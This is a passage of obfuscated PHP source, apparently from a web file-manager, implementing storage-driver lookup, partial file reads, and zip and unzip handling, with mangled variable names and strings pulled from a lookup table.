(isset($½şáíˆğ[$§ŞêâîŠ])) { if ($Ë­‘ÏØä[$÷ºÈğßÕ[78]] == 1) { continue; } if ($½şáíˆğ[$§ŞêâîŠ][$÷ºÈğßÕ[79]] == $Ë­‘ÏØä[$÷ºÈğßÕ[79]]) { continue; } } if ($Ë­‘ÏØä[$÷ºÈğßÕ[78]] == 1) { $ŞèèÜĞ›[] = $ÕŸŠ£Àç . $÷ºÈğßÕ[8] . trim($§ŞêâîŠ, $÷ºÈğßÕ[8]); continue; } $µ ½ç®Ù = strstr(trim($§ŞêâîŠ, $÷ºÈğßÕ[8]), $÷ºÈğßÕ[8]) ? get_path_father($§ŞêâîŠ) : $÷ºÈğßÕ[12]; $Œ”‰¸Çñ[] = array($÷ºÈğßÕ[1256] => $Ë­‘ÏØä[$÷ºÈğßÕ[89]], $÷ºÈğßÕ[1257] => rtrim($ÕŸŠ£Àç, $÷ºÈğßÕ[8]) . $÷ºÈğßÕ[8] . $µ ½ç®Ù, $÷ºÈğßÕ[1258] => $Ë­‘ÏØä); } $„õŞûØÄ = array($÷ºÈğßÕ[233] => $Œ”‰¸Çñ, $÷ºÈğßÕ[78] => $ŞèèÜĞ›); Hook::trigger($÷ºÈğßÕ[1259], $ŞªÃè™, $ÕŸŠ£Àç, $„õŞûØÄ); foreach ($ŞèèÜĞ› as $Ë­‘ÏØä) { IO::mkdir($Ë­‘ÏØä); } foreach ($Œ”‰¸Çñ as $Ë­‘ÏØä) { IO::copy($Ë­‘ÏØä[$÷ºÈğßÕ[1256]], $Ë­‘ÏØä[$÷ºÈğßÕ[1257]], REPEAT_REPLACE); } } public static function fileSubstr($åÑá» , $ë·×šá´, $ëîÅ“£ = false) { $ªÀ¶ÚŒó =& $_SERVER[´‹ô¯Œ]; $¼—šİ±Â = self::driverMake($åÑá» ); $ŸŒ¹Ç™Ù = $¼—šİ±Â->size($åÑá» ); $Á™ïÊøë = $ë·×šá´; $—­ŠÈê = $ëîÅ“£; if ($ë·×šá´ < 0) { $ë·×šá´ = $ŸŒ¹Ç™Ù + $ë·×šá´; } if ($ëîÅ“£ === !1) { $ëîÅ“£ = $ŸŒ¹Ç™Ù - $ë·×šá´; } if ($ë·×šá´ + $ëîÅ“£ > $ŸŒ¹Ç™Ù) { $ëîÅ“£ = $ŸŒ¹Ç™Ù - $ë·×šá´; } if (!$ŸŒ¹Ç™Ù && $¼—šİ±Â->getType() == $ªÀ¶ÚŒó[109] && !$¼—šİ±Â->exist($åÑá» )) { $›™øæ¾Í = get_path_this($åÑá» ); $¬Éòîßç = parse_url_query($›™øæ¾Í); if (is_array($¬Éòîßç) && isset($¬Éòîßç[$ªÀ¶ÚŒó[32]])) { $›™øæ¾Í = urldecode($¬Éòîßç[$ªÀ¶ÚŒó[32]]); } throw new Exception($ªÀ¶ÚŒó[1260] . LNG($ªÀ¶ÚŒó[1261]) . $ªÀ¶ÚŒó[1058] . clear_html($›™øæ¾Í) . $ªÀ¶ÚŒó[12]); } if ($ëîÅ“£ <= 0) { return $ªÀ¶ÚŒó[12]; } if ($ë·×šá´ < 0 || $ë·×šá´ >= $ŸŒ¹Ç™Ù || $ëîÅ“£ > $GLOBALS[$ªÀ¶ÚŒó[6]][$ªÀ¶ÚŒó[92]][$ªÀ¶ÚŒó[1262]]) { throw new Exception("\x66\151\x6c\x65\x52\x65\141\x64\x20\145\162\x72\157\162\54\x6f\x76\145\x72\40\x69\157\x52\x65\x61\x64\x4d\141\170\x21\40\163\x74\x61\x72\164\x3d{$ë·×šá´}\73\x6c\x65\x6e\x67\x74\150\75{$ëîÅ“£}\x3b\x20\x73\151\172\x65\75{$ŸŒ¹Ç™Ù}\x3b"); } $ı´È‡ù = $¼—šİ±Â->fileSubstr($åÑá» , $ë·×šá´, $ëîÅ“£); if (!$ı´È‡ù && $ëîÅ“£ && isset($GLOBALS[$ªÀ¶ÚŒó[1263]])) { throw new Exception($GLOBALS[$ªÀ¶ÚŒó[1263]][$ªÀ¶ÚŒó[1264]]); } return $ı´È‡ù; } private static function driverMake(&$¸÷ü‡âî) { $»Ñ¤¥Ô =& $_SERVER[´‹ô¯Œ]; $Ìé«²Á = KodIO::parse($¸÷ü‡âî); if (!self::$driverListSystem) { $‘©½Ì‡ò = Model($»Ñ¤¥Ô[853])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($‘©½Ì‡ò, $»Ñ¤¥Ô[487]); } if ($Ìé«²Á[$»Ñ¤¥Ô[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ìé«²Á[$»Ñ¤¥Ô[487]]]) { throw new Exception($»Ñ¤¥Ô[1265]); return !1; } $¸÷ü‡âî = $Ìé«²Á[$»Ñ¤¥Ô[1266]]; $ÉÄ×ïÊ‹ = self::driverGet($Ìé«²Á, $¸÷ü‡âî); return $ÉÄ×ïÊ‹; } private static function driverGet($çÖî™¬›, &$Ôà¹š¤£) { $Ø—ášõñ =& $_SERVER[´‹ô¯Œ]; $ÉÆ¨˜÷ = $çÖî™¬›[$Ø—ášõñ[1267]]; $Ë‹ºÓ«‹ = $çÖî™¬›[$Ø—ášõñ[487]]; switch ($çÖî™¬›[$Ø—ášõñ[33]]) { case KodIO::KOD_IO: $¬•çññ‘ = self::$driverListSystem[$Ë‹ºÓ«‹]; break; case KodIO::KOD_SOURCE: $Ôà¹š¤£ = $Ë‹ºÓ«‹ . $Ôà¹š¤£; $¬•çññ‘ = array($Ø—ášõñ[1268] => $Ø—ášõñ[1269], $Ø—ášõñ[6] => $çÖî™¬›); $¬•çññ‘[$Ø—ášõñ[6]][$Ø—ášõñ[1270]] = $çÖî™¬›[$Ø—ášõñ[487]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $É«ßø•ã = $GLOBALS[$Ø—ášõñ[1271]]; self::$driverListUser = array_to_keyvalue($É«ßø•ã, $Ø—ášõñ[487]); } $¬•çññ‘ = self::$driverListUser[$Ë‹ºÓ«‹]; break; case KodIO::KOD_SHARE_LINK: $¬•çññ‘ = array($Ø—ášõñ[1268] => $Ø—ášõñ[1272], $Ø—ášõñ[6] => $çÖî™¬›); $’„…—®º = Action($Ø—ášõñ[1273])->sharePathInfo($çÖî™¬›[$Ø—ášõñ[87]]); $Ôà¹š¤£ = $’„…—®º[$Ø—ášõñ[194]]; if (!$’„…—®º[$Ø—ášõñ[194]]) { $¸“¸¦… = Model($Ø—ášõñ[681])->getInfo($’„…—®º[$Ø—ášõñ[682]]); $Ôà¹š¤£ = KodIO::clear($¸“¸¦…[$Ø—ášõñ[1274]] . $çÖî™¬›[$Ø—ášõñ[1266]]); $çÖî™¬›[$Ø—ášõñ[574]] = $¸“¸¦…; $çÖî™¬›[$Ø—ášõñ[1247]] = $Ôà¹š¤£; $¬•çññ‘ = array($Ø—ášõñ[1268] => $Ø—ášõñ[1275], $Ø—ášõñ[6] => $çÖî™¬›); } else { $¬•çññ‘[$Ø—ášõñ[6]][$Ø—ášõñ[1270]] = $’„…—®º[$Ø—ášõñ[194]]; } break; case KodIO::KOD_SHARE_ITEM: $¬•çññ‘ = array($Ø—ášõñ[1268] => $Ø—ášõñ[1276], $Ø—ášõñ[6] => $çÖî™¬›); $¸“¸¦… = Model($Ø—ášõñ[681])->getInfo($çÖî™¬›[$Ø—ášõñ[487]]); if ($¸“¸¦…[$Ø—ášõñ[194]] == $Ø—ášõñ[231]) { $Ôà¹š¤£ = KodIO::clear($¸“¸¦…[$Ø—ášõñ[1274]] . $çÖî™¬›[$Ø—ášõñ[1266]]); $çÖî™¬›[$Ø—ášõñ[574]] = $¸“¸¦…; $çÖî™¬›[$Ø—ášõñ[1247]] = $Ôà¹š¤£; $¬•çññ‘ = array($Ø—ášõñ[1268] => $Ø—ášõñ[1277], $Ø—ášõñ[6] => $çÖî™¬›); } else { if (!$Ôà¹š¤£) { $Ôà¹š¤£ = $¸“¸¦…[$Ø—ášõñ[194]]; } $¬•çññ‘[$Ø—ášõñ[6]][$Ø—ášõñ[1270]] = $¸“¸¦…[$Ø—ášõñ[194]]; } break; default: $Ôà¹š¤£ = $çÖî™¬›[$Ø—ášõñ[87]]; $¬•çññ‘ = array($Ø—ášõñ[1268] => $Ø—ášõñ[1278]); break; } $€Ï‰±ïı = $çÖî™¬›[$Ø—ášõñ[87]]; if (!isset(self::$driverCache[$€Ï‰±ïı])) { $š† æÑ = strtolower($¬•çññ‘[$Ø—ášõñ[98]]); $‘êæª¤ı = $GLOBALS[$Ø—ášõñ[6]][$Ø—ášõñ[92]][$Ø—ášõñ[917]]; $Ê½î‰¼§ = $Ø—ášõñ[77] . (isset($‘êæª¤ı[$š† æÑ]) ? $‘êæª¤ı[$š† æÑ] : ucfirst($š† æÑ)); if (!class_exists($Ê½î‰¼§)) { show_json("{$Ê½î‰¼§}\40\x6e\x6f\x74\x20\x65\170\x69\x73\x74\163\41", !1); } $”ûüØ = isset($¬•çññ‘[$Ø—ášõñ[6]]) ? $¬•çññ‘[$Ø—ášõñ[6]] : !1; self::$driverCache[$€Ï‰±ïı] = new $Ê½î‰¼§($”ûüØ); } $›˜—³ = self::$driverCache[$€Ï‰±ïı]; $›˜—³->pathDriver = $ÉÆ¨˜÷; $›˜—³->pathBase = $Ø—ášõñ[12]; if (isset($¬•çññ‘[$Ø—ášõñ[6]][$Ø—ášõñ[1279]])) { $›˜—³->pathBase = rtrim($¬•çññ‘[$Ø—ášõñ[6]][$Ø—ášõñ[1279]], $Ø—ášõñ[8]) . $Ø—ášõñ[8]; $Ôà¹š¤£ = $›˜—³->pathBase . ltrim($Ôà¹š¤£, $Ø—ášõñ[8]); } $Ôà¹š¤£ = $›˜—³->getPath($Ôà¹š¤£); if (isset($çÖî™¬›[$Ø—ášõñ[1247]])) { $Ôà¹š¤£ = $çÖî™¬›[$Ø—ášõñ[1247]]; } $›˜—³->path = $Ôà¹š¤£; return $›˜—³; } public static function errorTips($ÜÎùÁ = false) { $„ú™óş =& $_SERVER[´‹ô¯Œ]; static $ì¦û¤‹® = array(); $ñ„®”»Ù = 1000; if ($ÜÎùÁ === -1) { return $ì¦û¤‹® ? $ì¦û¤‹®[count($ì¦û¤‹®) - 1] : $„ú™óş[12]; } if ($ÜÎùÁ === !1) { return implode($„ú™óş[288], $ì¦û¤‹®); } if (count($ì¦û¤‹®) >= $ñ„®”»Ù) { $ì¦û¤‹® = array_slice($ì¦û¤‹®, $ñ„®”»Ù * 0.5, $ñ„®”»Ù); } $ì¦û¤‹®[] = $ÜÎùÁ; write_log($„ú™óş[176] . ACTION . $„ú™óş[1280] . $ÜÎùÁ, $„ú™óş[1281]); } public static function getLastError($…ÜŠ¢ƒ = '') { $ÕÍ»Å¶Ğ = self::errorTips(-1); return $ÕÍ»Å¶Ğ ? $ÕÍ»Å¶Ğ : $…ÜŠ¢ƒ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $êÍóÀˆÆ; if ($êÍóÀˆÆ) { return $êÍóÀˆÆ; } $—™ØÌê = IO::init($_SERVER[´‹ô¯Œ][8]); return $—™ØÌê; } private static function iconvSystem($—¼óÁøƒ) { return self::local()->iconvSystem($—¼óÁøƒ); } private static function iconvApp($í“á÷íÕ) { return self::local()->iconvApp($í“á÷íÕ); } public static function zipFolder($“¼Õü‡Ø, $ı®‚³ò = "\172\151\160", $§³È÷ËÀ = '', $­•Šş©¸ = REPEAT_RENAME) { $Šà‘æøè =& $_SERVER[´‹ô¯Œ]; $»¾ßå­ = IO::listPath($“¼Õü‡Ø); if (!$»¾ßå­) { return !1; } $»¾ßå­ = array_merge($»¾ßå­[$Šà‘æøè[85]], $»¾ßå­[$Šà‘æøè[86]]); return self::zip($»¾ßå­, $ı®‚³ò, $§³È÷ËÀ, $­•Šş©¸); } public static function zip($™¼”‰Ş¡, $âèÆú¤— = "\x7a\151\160", $–´­Ì«á = '', $àäã¼ê = REPEAT_RENAME) { $ù³·İ­ã =& $_SERVER[´‹ô¯Œ]; if (is_string($™¼”‰Ş¡) && $™¼”‰Ş¡) { $™¼”‰Ş¡ = array(array($ù³·İ­ã[87] => $™¼”‰Ş¡)); } $öØô„ş¨ = self::init($™¼”‰Ş¡[0][$ù³·İ­ã[87]]); $É½¼ïô = self::info($™¼”‰Ş¡[0][$ù³·İ­ã[87]]); $²¡ÚÊöâ = $ù³·İ­ã[12]; $ÛÃ´Ùßß = $ù³·İ­ã[12]; $“×÷Àš¹ = $ù³·İ­ã[12]; if ($–´­Ì«á && substr($–´­Ì«á, -1, 1) != $ù³·İ­ã[8]) { $ÛÃ´Ùßß = get_path_father($–´­Ì«á); $“×÷Àš¹ = get_path_this($–´­Ì«á); } else { $ÛÃ´Ùßß = self::pathFather($É½¼ïô[$ù³·İ­ã[87]]); $“×÷Àš¹ = $É½¼ïô[$ù³·İ­ã[32]] . $ù³·İ­ã[10] . $âèÆú¤—; if (count($™¼”‰Ş¡) > 1) { $Ë´×÷š = IO::info($ÛÃ´Ùßß); $“×÷Àš¹ = $Ë´×÷š[$ù³·İ­ã[32]] . $ù³·İ­ã[10] . $âèÆú¤—; } if ($–´­Ì«á) { $ÛÃ´Ùßß = $–´­Ì«á; } } if ($öØô„ş¨->getType() == $ù³·İ­ã[109]) { $‚”ÈÂ¾ğ = self::init($ÛÃ´Ùßß); $£éÚ™¨Î = $‚”ÈÂ¾ğ->getType() == $ù³·İ­ã[109] ? $ÛÃ´Ùßß : get_path_father($öØô„ş¨->path); $£éÚ™¨Î = IO::getPathInner($£éÚ™¨Î); $£éÚ™¨Î = rtrim($£éÚ™¨Î, $ù³·İ­ã[8]) . $ù³·İ­ã[8]; mk_dir($£éÚ™¨Î); } else { $²¡ÚÊöâ = TEMP_FILES . $ù³·İ­ã[1282] . time() . rand_string(8) . $ù³·İ­ã[8]; mk_dir($²¡ÚÊöâ); file_put_contents($²¡ÚÊöâ . $ù³·İ­ã[1283], $ù³·İ­ã[12]); $£éÚ™¨Î = $²¡ÚÊöâ; } $ö›˜ÅÊ« = IO::info($£éÚ™¨Î); if (!$ö›˜ÅÊ« || !$ö›˜ÅÊ«[$ù³·İ­ã[236]]) { show_json(LNG($ù³·İ­ã[1284]), !1); } $·ë˜áñå = self::zipFileList($™¼”‰Ş¡, $²¡ÚÊöâ); foreach ($·ë˜áñå as $Ê•Õé¥É => $ğûÙôÊ®) { $·ë˜áñå[$Ê•Õé¥É] = self::iconvSystem($ğûÙôÊ®); } $îÆò†»™ = get_filename_auto($£éÚ™¨Î . $“×÷Àš¹, $ù³·İ­ã[12], $àäã¼ê); KodArchive::create(self::iconvSystem($îÆò†»™), $·ë˜áñå); if (!IO::exist($îÆò†»™)) { if ($²¡ÚÊöâ) { del_dir($²¡ÚÊöâ); } write_log($ù³·İ­ã[1285] . $îÆò†»™, $ù³·İ­ã[391]); show_json(LNG($ù³·İ­ã[1286]), !1); } if (!$²¡ÚÊöâ) { return $îÆò†»™; } $‰Ò·úÉ‚ = self::move($îÆò†»™, $ÛÃ´Ùßß, $àäã¼ê); if ($²¡ÚÊöâ) { del_dir($²¡ÚÊöâ); } if (!$îÆò†»™) { write_log($ù³·İ­ã[1287] . $îÆò†»™ . $ù³·İ­ã[1288] . $ÛÃ´Ùßß, $ù³·İ­ã[391]); show_json(LNG($ù³·İ­ã[1286]), !1); } return $‰Ò·úÉ‚; } public static function unzip($ÂŸæÃÏ¼, $²Ò‘¸“³, $à àö×å = "\55\x31", $¥Ê×öí = "\x72\x65\160\154\x61\143\x65") { $Í¸è×”± =& $_SERVER[´‹ô¯Œ]; $ì“åÒª = parent::info($ÂŸæÃÏ¼); if (!$ì“åÒª) { show_json(LNG($Í¸è×”±[1289]), !1); } $êëúœâÖ = IO::infoFullSimple($²Ò‘¸“³); if (!$êëúœâÖ) { $²Ò‘¸“³ = IO::mkdir($²Ò‘¸“³); } if (isset($êëúœâÖ[$Í¸è×”±[194]]) && trim($êëúœâÖ[$Í¸è×”±[87]], $Í¸è×”±[8]) != trim($²Ò‘¸“³, $Í¸è×”±[8])) { $¤°€ßúÙ = KodIO::make($êëúœâÖ[$Í¸è×”±[193]]); $Ê¯¦Ûç = IO::fileNameAuto($¤°€ßúÙ, $êëúœâÖ[$Í¸è×”±[32]], REPEAT_RENAME_FOLDER, !0); $²Ò‘¸“³ = IO::mkdir($¤°€ßúÙ . $Ê¯¦Ûç); } $à àö×å = $à àö×å && $à àö×å != $Í¸è×”±[1290] ? @json_decode($à àö×å, !0) : -1; $‹ãœœ‘­ = self::unzipPart($ÂŸæÃÏ¼, $à àö×å); if (!$‹ãœœ‘­ || !IO::exist($‹ãœœ‘­[$Í¸è×”±[233]])) { show_json(LNG($Í¸è×”±[108]), !1); } $µ†÷ƒ—Û = $‹ãœœ‘­[$Í¸è×”±[1291]][count($‹ãœœ‘­[$Í¸è×”±[1291]]) - 1]; if ($µ†÷ƒ—Û[$Í¸è×”±[1292]] == -1 || substr($µ†÷ƒ—Û[$Í¸è×”±[32]], -1, 1) == $Í¸è×”±[8]) { $‹¼¥ŠƒÌ = $‹ãœœ‘­[$Í¸è×”±[1293]] . rand_string(10) . $Í¸è×”±[8]; mk_dir($‹¼¥ŠƒÌ); $€½×î¶ = count($‹ãœœ‘­[$Í¸è×”±[1291]]) == 1 ? IO::ext($ÂŸæÃÏ¼) : get_path_ext($‹ãœœ‘­[$Í¸è×”±[233]]); $ù¯·â˜ã = KodArchive::extract(self::iconvSystem($‹ãœœ‘­[$Í¸è×”±[233]]), $‹¼¥ŠƒÌ, $µ†÷ƒ—Û[$Í¸è×”±[1292]], $Ê¯¦Ûç, $€½×î¶); self::unzipErrorCheck($ù¯·â˜ã, array($Í¸è×”±[1294], $ÂŸæÃÏ¼, $€½×î¶, $²Ò‘¸“³, $‹ãœœ‘­)); Hook::trigger($Í¸è×”±[1295], $‹¼¥ŠƒÌ); recursion_dir($‹¼¥ŠƒÌ, $Œßö·É, $î¦Ï§Ñ·, 0); $†º±´Úş = array_merge($Œßö·É, $î¦Ï§Ñ·); $ò®›ö = array(); foreach ($†º±´Úş as $¶â¯€³é) { $ÓôÉ¦ªâ = IO::move(self::iconvApp($¶â¯€³é), $²Ò‘¸“³, $¥Ê×öí); if ($ÓôÉ¦ªâ) { $ò®›ö[] = $ÓôÉ¦ªâ; } } del_dir($‹¼¥ŠƒÌ); } else { $ÓôÉ¦ªâ = IO::move($‹ãœœ‘­[$Í¸è×”±[233]], $²Ò‘¸“³, $¥Ê×öí, get_path_this($µ†÷ƒ—Û[$Í¸è×”±[32]])); if ($ÓôÉ¦ªâ) { $ò®›ö[] = $ÓôÉ¦ªâ; } } return $ò®›ö ? $ò®›ö : !1; } public static function unzipList($Í‚ìŞ¾) { $èøÉëˆ· =& $_SERVER[´‹ô¯Œ]; $ªçÇşÔ = isset($Í‚ìŞ¾[$èøÉëˆ·[1296]]) ? $Í‚ìŞ¾[$èøÉëˆ·[1296]] : !1; $™¤åéÕŒ = isset($Í‚ìŞ¾[$èøÉëˆ·[1292]]) ? @json_decode($Í‚ìŞ¾[$èøÉëˆ·[1292]], !0) : -1; $–æŞãìÄ = self::unzipPart($Í‚ìŞ¾[$èøÉëˆ·[87]], $™¤åéÕŒ); if (!$–æŞãìÄ || !IO::exist($–æŞãìÄ[$èøÉëˆ·[233]])) { show_json(LNG($èøÉëˆ·[108]), !1); } $Ñ‚‹Ó®÷ = $–æŞãìÄ[$èøÉëˆ·[1291]][count($–æŞãìÄ[$èøÉëˆ·[1291]]) - 1]; $æ¹‡éª® = in_array(IO::ext($–æŞãìÄ[$èøÉëˆ·[233]]), array($èøÉëˆ·[391], $èøÉëˆ·[1297], $èøÉëˆ·[1298], $èøÉëˆ·[1299], $èøÉëˆ·[1300], $èøÉëˆ·[1301])); if (!$ªçÇşÔ && ($Ñ‚‹Ó®÷[$èøÉëˆ·[1292]] == -1 || $æ¹‡éª®)) { $Ó­ŒÆÖŸ = $–æŞãìÄ[$èøÉëˆ·[1293]] . get_path_this($–æŞãìÄ[$èøÉëˆ·[233]]) . $èøÉëˆ·[1302]; if (!IO::exist($Ó­ŒÆÖŸ)) { $Õ‘éù·¥ = $Ñ‚‹Ó®÷[$èøÉëˆ·[1292]] == -1 ? get_path_ext(IO::pathThis($Í‚ìŞ¾[$èøÉëˆ·[87]])) : get_path_ext($–æŞãìÄ[$èøÉëˆ·[233]]); $™ªë·«Å = KodArchive::listContent(self::iconvSystem($–æŞãìÄ[$èøÉëˆ·[233]]), !0, $Õ‘éù·¥); self::unzipErrorCheck($™ªë·«Å, array($èøÉëˆ·[1303], $Í‚ìŞ¾, $–æŞãìÄ)); @file_put_contents($Ó­ŒÆÖŸ, json_encode($™ªë·«Å[$èøÉëˆ·[1304]])); } return @json_decode(IO::getContent($Ó­ŒÆÖŸ), !0); } IO::fileOut($–æŞãìÄ[$èøÉëˆ·[233]], $ªçÇşÔ, get_path_this($Ñ‚‹Ó®÷[$èøÉëˆ·[32]])); die; } private static function zipFileList($Åğ˜ÈÕ¼, $»µô‹±ï = false) { $ÂÇì‘¿£ =& $_SERVER[´‹ô¯Œ]; $ó¥œı  = array(); foreach ($Åğ˜ÈÕ¼ as $¸Ú™‘°¶) { $ãÇÏíŞÌ = $¸Ú™‘°¶[$ÂÇì‘¿£[87]]; if ($»µô‹±ï) { $ãÇÏíŞÌ = self::copy($¸Ú™‘°¶[$ÂÇì‘¿£[87]], $»µô‹±ï, $ÂÇì‘¿£[910]); } else { $ã×Ë¾è = self::init($¸Ú™‘°¶[$ÂÇì‘¿£[87]]); if ($ã×Ë¾è->getType() == $ÂÇì‘¿£[109]) { $ãÇÏíŞÌ = $ã×Ë¾è->path; } } if ($ãÇÏíŞÌ && self::local()->exist($ãÇÏíŞÌ)) { $ó¥œı [$¸Ú™‘°¶[$ÂÇì‘¿£[87]]] = $ãÇÏíŞÌ; } } if (!empty($ó¥œı )) { return array_values($ó¥œı ); } show_json(LNG($ÂÇì‘¿£[1261]), !1); } private static function localFilePath($óÜÌ¥¢Æ) { $ˆØÊÕü =& $_SERVER[´‹ô¯Œ]; $İò–Ë´‡ = KodIO::parse($óÜÌ¥¢Æ); if ($İò–Ë´‡[$ˆØÊÕü[33]] == KodIO::KOD_SOURCE) { $¿ù¿é¯Ô = Model($ˆØÊÕü[916])->fileInfoGet(KodIO::sourceID($óÜÌ¥¢Æ)); if (!$¿ù¿é¯Ô[$ˆØÊÕü[87]]) { show_json($ˆØÊÕü[1305], !1); } $óÜÌ¥¢Æ = $¿ù¿é¯Ô[$ˆØÊÕü[87]]; } $Î•¿“ËĞ = self::init($óÜÌ¥¢Æ); if ($Î•¿“ËĞ->pathParse[$ˆØÊÕü[1247]]) { $óÜÌ¥¢Æ = $Î•¿“ËĞ->pathParse[$ˆØÊÕü[1247]]; $Î•¿“ËĞ = self::init($óÜÌ¥¢Æ); } $Ó¼Àó™Â = $Î•¿“ËĞ->getType(); if ($Ó¼Àó™Â == $ˆØÊÕü[109] || $Ó¼Àó™Â == $ˆØÊÕü[1306]) { if (!$Î•¿“ËĞ->exist($Î•¿“ËĞ->path)) { show_json(LNG($ˆØÊÕü[108]), !1); } return $Î•¿“ËĞ->path; } return !1; } public static function unzipPart($ôĞ‚àî­, $“ñ£ìê€ = -1) { $ùî‰Ã÷Ğ =& $_SERVER[´‹ô¯Œ]; $üÍåÅËú = IO::pathThis($ôĞ‚àî­); if (!$“ñ£ìê€ || $“ñ£ìê€ == -1) { $å¾ãÚä = array(array($ùî‰Ã÷Ğ[32] => $üÍåÅËú, $ùî‰Ã÷Ğ[1292] => -1)); $å¾ãÚä[0][$ùî‰Ã÷Ğ[1307]] = $å¾ãÚä[0][$ùî‰Ã÷Ğ[32]]; } else { if (is_array($“ñ£ìê€)) { $å¾ãÚä = $“ñ£ìê€; $—ÍÀêµİ = count($å¾ãÚä) - 1; for ($ŸşÆ¼­ = 0; $ŸşÆ¼­ <= $—ÍÀêµİ; $ŸşÆ¼­++) { $£¾™ù¶ô = $å¾ãÚä[$ŸşÆ¼­]; $æ Ü’ô„ = get_path_this($£¾™ù¶ô[$ùî‰Ã÷Ğ[32]]) . (checkExtSafe($£¾™ù¶ô[$ùî‰Ã÷Ğ[32]]) ? $ùî‰Ã÷Ğ[12] : $ùî‰Ã÷Ğ[1308]); $å¾ãÚä[$ŸşÆ¼­][$ùî‰Ã÷Ğ[1307]] = $ùî‰Ã÷Ğ[1309] . intval($£¾™ù¶ô[$ùî‰Ã÷Ğ[1292]]) . $ùî‰Ã÷Ğ[465] . $æ Ü’ô„; if ($ŸşÆ¼­ == 0) { continue; } $å¾ãÚä[$ŸşÆ¼­][$ùî‰Ã÷Ğ[1307]] = $å¾ãÚä[$ŸşÆ¼­ - 1][$ùî‰Ã÷Ğ[1307]] . $ùî‰Ã÷Ğ[1310] . $å¾ãÚä[$ŸşÆ¼­][$ùî‰Ã÷Ğ[1307]]; } } } if (!is_array($å¾ãÚä) || count($å¾ãÚä) == 0) { return !1; } $çÉäö®å = $å¾ãÚä[count($å¾ãÚä) - 1]; if (!IO::exist($ôĞ‚àî­)) { return !1; } $Ä‰Ñ«ó÷ = TEMP_FILES . $ùî‰Ã÷Ğ[1311] . kodIO::hashPathSafe($ôĞ‚àî­) . $ùî‰Ã÷Ğ[8]; $¥’˜±—Ü = $Ä‰Ñ«ó÷ . $çÉäö®å[$ùî‰Ã÷Ğ[1307]]; mk_dir($Ä‰Ñ«ó÷); file_put_contents(TEMP_FILES . $ùî‰Ã÷Ğ[1283], $ùî‰Ã÷Ğ[12]); if (IO::exist($¥’˜±—Ü)) { return array($ùî‰Ã÷Ğ[233] => $¥’˜±—Ü, $ùî‰Ã÷Ğ[1291] => $å¾ãÚä, $ùî‰Ã÷Ğ[1293] => $Ä‰Ñ«ó÷); } $ØŸ‚Œ±é = self::localFilePath($ôĞ‚àî­); if (!$ØŸ‚Œ±é) { $ØŸ‚Œ±é = $Ä‰Ñ«ó÷ . $ùî‰Ã÷Ğ[1312]; if (!IO::exist($ØŸ‚Œ±é)) { self::copy($ôĞ‚àî­, $Ä‰Ñ«ó÷, !1, get_path_this($ØŸ‚Œ±é)); } } if (!$ØŸ‚Œ±é || !IO::exist($ØŸ‚Œ±é)) { return !1; } if ($çÉäö®å[$ùî‰Ã÷Ğ[1292]] == -1) { return array($ùî‰Ã÷Ğ[233] => $ØŸ‚Œ±é, $ùî‰Ã÷Ğ[1291] => $å¾ãÚä, $ùî‰Ã÷Ğ[1293] => $Ä‰Ñ«ó÷); } $úæíƒú™ = $ØŸ‚Œ±é; foreach ($å¾ãÚä as $ŸşÆ¼­ => $£¾™ù¶ô) { if (!$£¾™ù¶ô || $£¾™ù¶ô[$ùî‰Ã÷Ğ[1292]] == $ùî‰Ã÷Ğ[1290]) { break; } if (substr($£¾™ù¶ô[$ùî‰Ã÷Ğ[32]], -1, 1) == $ùî‰Ã÷Ğ[8]) { break; } $®¦ûŞŒÜ = in_array(get_path_ext($£¾™ù¶ô[$ùî‰Ã÷Ğ[1307]]), array($ùî‰Ã÷Ğ[391], $ùî‰Ã÷Ğ[1297], $ùî‰Ã÷Ğ[1298], $ùî‰Ã÷Ğ[1299], $ùî‰Ã÷Ğ[1300], $ùî‰Ã÷Ğ[1301])); $ûØÖñ²ï = $ŸşÆ¼­ == count($å¾ãÚä) - 1 && $®¦ûŞŒÜ; $·ŞŞ„²Ä = $Ä‰Ñ«ó÷ . $£¾™ù¶ô[$ùî‰Ã÷Ğ[1307]]; $¤¤‘¹Ø­ = $Ä‰Ñ«ó÷ . get_path_this($£¾™ù¶ô[$ùî‰Ã÷Ğ[32]]); if (IO::exist($·ŞŞ„²Ä)) { $úæíƒú™ = $·ŞŞ„²Ä; continue; } $ÇÓêß·ø = $ŸşÆ¼­ == 0 ? get_path_ext($üÍåÅËú) : get_path_ext($úæíƒú™); $»‚Îí† = KodArchive::extract(self::iconvSystem($úæíƒú™), $Ä‰Ñ«ó÷, $£¾™ù¶ô[$ùî‰Ã÷Ğ[1292]], $®±‰­š, $ÇÓêß·ø); self::unzipErrorCheck($»‚Îí†, array($ùî‰Ã÷Ğ[1313], $ôĞ‚àî­, $å¾ãÚä, $£¾™ù¶ô, $·ŞŞ„²Ä)); if (IO::exist($¤¤‘¹Ø­)) { IO::rename($¤¤‘¹Ø­, get_path_this($·ŞŞ„²Ä)); } $úæíƒú™ = $·ŞŞ„²Ä; } $¥’˜±—Ü = $úæíƒú™; return array($ùî‰Ã÷Ğ[233] => $úæíƒú™, $ùî‰Ã÷Ğ[1291] => $å¾ãÚä, $ùî‰Ã÷Ğ[1293] => $Ä‰Ñ«ó÷); } private static function unzipErrorCheck($¯œ„œÊò, $ï¦š‘Æ = false) { $—”œ“Ñµ =& $_SERVER[´‹ô¯Œ]; if ($¯œ„œÊò[$—”œ“Ñµ[1314]]) { return !0; } write_log(array($—”œ“Ñµ[1315], $¯œ„œÊò, $ï¦š‘Æ), $—”œ“Ñµ[1316]); $õå½¹åı = is_array($¯œ„œÊò[$—”œ“Ñµ[1304]]) ? json_encode($¯œ„œÊò[$—”œ“Ñµ[1304]]) : $¯œ„œÊò[$—”œ“Ñµ[1304]]; show_json($—”œ“Ñµ[1317] . $õå½¹åı, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $‰¸ôÁ¯« =& $_SERVER[´‹ô¯Œ]; $’ÁÛö = $GLOBALS[$‰¸ôÁ¯«[6]][$‰¸ôÁ¯«[92]]; if ($’ÁÛö[$‰¸ôÁ¯«[1318]] != 1) { return; } if ($’ÁÛö[$‰¸ôÁ¯«[1319]] <= 0) { return; } if (isset($_REQUEST[$‰¸ôÁ¯«[1320]]) && $_REQUEST[$‰¸ôÁ¯«[1320]] == $‰¸ôÁ¯«[91]) { return; } 